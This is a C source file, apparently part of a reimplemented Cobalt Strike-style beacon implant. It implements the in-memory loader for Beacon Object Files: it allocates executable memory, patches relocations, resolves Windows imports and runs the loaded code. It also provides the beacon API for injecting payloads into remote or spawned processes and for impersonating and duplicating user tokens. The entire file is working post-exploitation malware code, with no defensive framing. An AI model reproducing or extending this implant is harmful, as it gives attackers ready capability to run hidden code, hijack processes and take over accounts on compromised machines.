#include "BeaconBof.h"
//#include "c2profile.h"

void __cdecl BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
{
    ProcessInject(pid, 0, hProc, payload, p_len, p_offset, arg, a_len);
}
void __cdecl BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pi, char* payload, int p_len,int p_offset,char* arg,int arg_len)
{
    ProcessInject(pi->dwProcessId, pi, pi->hProcess, payload, p_len, p_offset, arg, arg_len);
}

void __cdecl BeaconGetSpawnTo(BOOL x86, char* buffer, int length)
{
    char path[256];

    getspawntopath(path, x86);
    if (length >= 256)
    {
        memcpy(buffer, path, 0x100u);
    }
    else
    {
        memcpy(buffer, path, length);
    }
}

BOOL __cdecl SetBeaconToken(HANDLE hToken, char* buffer)
{
    BeaconRevertToken();
    if (!ImpersonateLoggedOnUser(hToken)
        || !DuplicateTokenEx(hToken, 0x2000000u, 0, SecurityDelegation, TokenPrimary, &pTokenHandle)
        || !ImpersonateLoggedOnUser(pTokenHandle)
        || !get_user_sid(0x100u, pTokenHandle, buffer))
    {
        return 0;
    }
    BeaconTaskOutput(buffer, strlen(buffer), 15u);
    return 1;
}

BOOL __cdecl BeaconUseToken(HANDLE hToken)
{

    char* buffer = (char*)malloc(256u);
    memset(buffer, 0, 256);
    BOOL ret = SetBeaconToken(hToken, buffer);
    memset(buffer, 0, 256);
    free(buffer);
    return ret;
}
void __cdecl BeaconOutput(int type, char* data, int len)
{
    BeaconTaskOutput(data, len, type);
}
void __cdecl BeaconPrintf(int type, char* fmt, ...)
{
    va_list ArgList=0;
    va_start(ArgList, fmt);
    int size = vprintf(fmt, ArgList);
    if (size > 0)
    {
        char* buffer = (char*)malloc(size + 1);
        buffer[size] = 0;
        vsprintf_s(buffer, size + 1, fmt, ArgList);
        BeaconTaskOutput(buffer ,size, type);
        memset(buffer, 0, size);
        free(buffer);
    }
}
void InitInternalFunctions(BeaconInternalFunctions* InternalFunctions)
{
    memset(InternalFunctions, 0, 252);
    InternalFunctions->LoadLibraryA = LoadLibraryA;
    InternalFunctions->FreeLibrary = FreeLibrary;
    InternalFunctions->GetProcAddress = GetProcAddress;
    InternalFunctions->GetModuleHandleA = GetModuleHandleA;
    InternalFunctions->BeaconDataParse = BeaconDataParse;
    InternalFunctions->BeaconDataPtr = BeaconDataPtr;
    InternalFunctions->BeaconDataInt = BeaconDataInt;
    InternalFunctions->BeaconDataShort = BeaconDataShort;
    InternalFunctions->BeaconDataLength = BeaconDataLength;
    InternalFunctions->BeaconDataExtract = BeaconDataExtract;
    InternalFunctions->BeaconFormatAlloc = BeaconFormatAlloc;
    InternalFunctions->BeaconFormatReset = BeaconFormatReset;
    InternalFunctions->BeaconFormatAppend = BeaconFormatAppend;
    InternalFunctions->BeaconFormatPrintf = BeaconFormatPrintf;
    InternalFunctions->BeaconFormatToString = BeaconFormatToString;
    InternalFunctions->BeaconFormatFree = BeaconFormatFree;
    InternalFunctions->BeaconFormatInt = BeaconFormatInt;
    InternalFunctions->BeaconOutput = BeaconOutput;
    InternalFunctions->BeaconPrintf = BeaconPrintf;
    InternalFunctions->BeaconErrorD = BeaconErrorD;
    InternalFunctions->BeaconErrorDD = BeaconErrorDD;
    InternalFunctions->BeaconErrorNA = BeaconErrorNA;
    InternalFunctions->BeaconUseToken = BeaconUseToken;
    InternalFunctions->BeaconRevertToken = BeaconRevertToken;
    InternalFunctions->BeaconIsAdmin = is_admin;
    InternalFunctions->BeaconGetSpawnTo = BeaconGetSpawnTo;
    InternalFunctions->BeaconInjectProcess = BeaconInjectProcess;
    InternalFunctions->BeaconInjectTemporaryProcess = BeaconInjectTemporaryProcess;
    InternalFunctions->BeaconSpawnTemporaryProcess = BeaconSpawnTemporaryProcess;
    InternalFunctions->BeaconCleanupProcess = BeaconcloseAllHandle;
    InternalFunctions->toWideChar = toWideChar;
}

int FixRelocation(BeaconBofRelocation* pBofRelocation, char* pcode_data, char* seg, int OffsetInSection, char* bof_code)
{
    if (pBofRelocation->Type == 6)
    {
        *(DWORD*)&pcode_data[pBofRelocation->offset] += (DWORD)&seg[OffsetInSection];
        return 1;
    }
    if (pBofRelocation->Type == 20)
    {
        *(DWORD*)&pcode_data[pBofRelocation->offset] = (DWORD)&seg[*(DWORD*)&pcode_data[pBofRelocation->offset]
            - pBofRelocation->offset
            - (DWORD)bof_code
            - 4
            + OffsetInSection];
        return 1;
    }
    BeaconErrorD(79, pBofRelocation->Type);
    return 0;
}


char* GetBeaconFunPtr(BeaconInternalFunctions* pinternalFunctions, char* pfun)
{
    char** p_end = &pinternalFunctions->end;
    int number = 0 ;
    char** pbeaconfun = &pinternalFunctions->end;
    do
    {
        if (*pbeaconfun == pfun)
        {
            return (char*)(&pinternalFunctions->end + number);
        }
        ++number;
        ++pbeaconfun;
    } while (number < 32);

    number = 0;
    while (*p_end)
    {
        ++number;
        ++p_end;
        if (number >= 32)
        {
            return 0;
        }
    }
    char* fun = (char*)(&pinternalFunctions->end + number);
    *(char**)fun = pfun;
    return fun;
}

void __cdecl beacon_bof(LPVOID lpParam)
{
    char* Taskdata = (char*)(*(char**)lpParam);
    int Tasksize = *(int*)(*((int**)lpParam+1));
    BeaconInternalFunctions* internalFunctions = (BeaconInternalFunctions*)malloc(252);
    InitInternalFunctions(internalFunctions);

//             4 getEntryPoint
//             4 code
//             4 rdata
//             4 data2
//             4 relocations
//             4 args
    datap pdatap;
    BeaconDataParse(&pdatap, Taskdata, Tasksize);
    int getEntryPoint = BeaconDataInt(&pdatap);

    int code_size = 0;
    char* pcode = BeaconDataPtr3(&pdatap,&code_size);

    int rdata_size = 0;
    char* prdata = BeaconDataPtr3(&pdatap, &rdata_size);

    int data2_size = 0;
    char* pdata2 = BeaconDataPtr3(&pdatap, &data2_size);

    int relocations_size = 0;
    char* prelocations = BeaconDataPtr3(&pdatap, &relocations_size);

    int alen = 0;
    char* args = BeaconDataPtr3(&pdatap, &alen);

    char* bof_code = (char*)VirtualAlloc(0, code_size, 0x3000u, decryptInt(shark_bofrwx));
    if (bof_code)
    {

        datap pdatap;
        BeaconDataParse(&pdatap, prelocations, relocations_size);
        BeaconBofRelocation* pBofRelocation = (BeaconBofRelocation*)BeaconDataPtr(&pdatap, 12);
        while (1)
        {
            BOOL status;
            short id = pBofRelocation->id;
            if (id == 1028)                         // SYMBOL_END
            {
                break;
            }
            if (id == 1024)                         // SYMBOL_RDATA
            {
                status = FixRelocation(pBofRelocation, pcode, prdata, pBofRelocation->OffsetInSection, bof_code);//修复rdata重定位
            }
            else if (id == 1025)                    // SYMBOL_DATA
            {
                status = FixRelocation(pBofRelocation, pcode, pdata2, pBofRelocation->OffsetInSection, bof_code);//修复DATA段重定位
            }
            else if (id == 1026)                    // SYMBOL_TEXT
            {
                status = FixRelocation(pBofRelocation, pcode, bof_code, pBofRelocation->OffsetInSection, bof_code);//修复code段重定位
            }
            else
            {
                char* pfun;
                if (id == 1027)                       // SYMBOL_DYNAMICF
                {
                    char* strModule = BeaconDataPtr2(&pdatap);
                    char* strFunction = BeaconDataPtr2(&pdatap);
                    HMODULE dllbase = GetModuleHandleA(strModule);
                    if (!dllbase)
                    {
                        dllbase = LoadLibraryA(strModule);
                    }
                    FARPROC functionaddress = GetProcAddress(dllbase, strFunction);
                    if (!functionaddress)
                    {
                        BeaconErrorFormat(76, (char*)"%s!%s", strModule, strFunction);
                        return;
                    }
                    char* p = GetBeaconFunPtr(internalFunctions, (char*)functionaddress);
                    if (!p)
                    {
                        BeaconErrorNA(0x4Eu);
                        return;
                    }
                    pfun = p;
                }
                else//修复
                {
                    pfun = (char*)(&internalFunctions->LoadLibraryA + id);
                }
                status = FixRelocation(pBofRelocation, pcode, pfun, 0, bof_code);
            }
            if (!status)
            {
                return;
            }
            pBofRelocation = (BeaconBofRelocation*)BeaconDataPtr(&pdatap, 12);
        }
        memcpy(bof_code, pcode, code_size);
        memset(pcode, 0, code_size);
        if (CheckMemoryRWX(bof_code, code_size))
        {
            try{
                ((void(__cdecl*)(char*, UINT)) & bof_code[getEntryPoint])(args, alen);
            }catch(...){

            }

        }
        VirtualFree(bof_code, 0, 0x8000);
        free(internalFunctions);
    }
    //自添加
    ReleaseMutex(galaEvent);

}